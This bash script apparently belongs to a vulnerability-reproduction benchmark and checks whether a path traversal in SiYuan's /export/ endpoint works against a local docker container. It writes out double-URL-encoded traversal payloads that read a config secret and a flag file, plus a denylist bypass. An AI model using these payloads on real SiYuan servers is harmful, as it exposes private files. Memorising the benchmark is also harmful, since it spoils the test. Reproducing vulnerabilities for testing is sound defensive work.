#!/usr/bin/env bash
# verify.sh --seed|--residual — siyuan-cve-2026-41894 (PCBV2-0036)
#
# 机制：/export/ 二次 url.PathUnescape + filepath.Join 逃出 export 目录。
#   seed     %252e%252e/%252e%252e/conf/pcb_secret.txt
#            V0(3.5.9)  无 IsSensitivePath -> conf 金丝雀
#            V1(3.5.10) denylist 拦 conf/ -> 阻断
#   residual %252e%252e/pcb_flag.txt
#            V1 denylist 不拦 workspace/temp/pcb_flag.txt（CVE-2026-41894）
# 效果通道 = /export/ 响应 body。判定用本次 RUN_FLAG（wrong/stale 为 override）。
# 退出码：0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }

CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR" 2>/dev/null || true
if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

dc() { docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" "$@"; }

PORT="$(dc port "$VERSION" 6806 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
if [[ -z "$PORT" ]]; then
  PORT="${PUBLISHED_PORT:-}"
fi
if [[ -z "$PORT" ]]; then
  echo "verify: cannot resolve ${VERSION}:6806" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT"

ready=0
for _ in $(seq 1 60); do
  code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 \
    -H 'Content-Type: application/json' \
    -d '{"authCode":"pcb"}' \
    "http://127.0.0.1:${PORT}/api/system/loginAuth" || true)"
  if [[ "$code" == "200" ]]; then
    ready=1
    break
  fi
  sleep 2
done
if [[ "$ready" != "1" ]]; then
  echo "verify: loginAuth timeout on :${PORT}" >&2
  exit 20
fi

if [[ "$MODE" == "--seed" ]]; then
  PAYLOAD="%252e%252e/%252e%252e/conf/pcb_secret.txt"
else
  PAYLOAD="%252e%252e/pcb_flag.txt"
fi

OUT="$("$PY" - "$PORT" "$RUN_FLAG" "$VERSION" "$PAYLOAD" <<'PYEOF'
import http.cookiejar, json, sys, urllib.error, urllib.request
port, flag, version, payload = sys.argv[1:5]
base = "http://127.0.0.1:%s" % port
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
try:
    op.open(urllib.request.Request(
        base + "/api/system/loginAuth",
        data=json.dumps({"authCode": "pcb"}).encode(),
        headers={"Content-Type": "application/json"}), timeout=20).read()
except Exception:
    pass
try:
    with op.open(urllib.request.Request(base + "/export/" + payload), timeout=25) as r:
        status, body = r.status, r.read().decode("utf-8", "replace")
except urllib.error.HTTPError as e:
    status, body = e.code, e.read().decode("utf-8", "replace")
except Exception as e:
    print("verify: connection failed: %s" % e, file=sys.stderr)
    sys.exit(20)
print("[%s] GET /export/%s status=%s body_head=%r" % (version, payload, status, body[:100]))
sys.exit(0 if flag in body else 10)
PYEOF
)"
rc=$?
echo "$OUT"
echo "verify[$MODE] version=$VERSION rc=$rc" >&2
exit "$rc"
